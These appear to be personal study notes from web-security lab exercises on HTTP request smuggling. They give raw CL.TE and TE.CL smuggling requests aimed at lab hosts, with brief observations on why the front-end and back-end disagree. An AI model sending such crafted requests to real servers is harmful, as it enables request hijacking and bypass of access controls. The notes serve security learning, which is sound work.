# Encounters

# HTTP/1 Request Smuggling CL.TE vuln
```
POST / HTTP/1.1
Host: 0a1e007203a734d881dc340c000700f9.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```
## Observations
- Could use Burp Extension to find smuggling. 
- This occurs because the front-end server doesn't support chunked encoding but the back-end server does. 
- Send the first request and get a normal response, send it again and you'll get the 404. 

# Request smuggling TE.CL 
- The backend doesn't support transfer encoding but the front end does. 
```
POST / HTTP/1.1
Host: 0a51008a03e8dd4780a2121300af007c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```


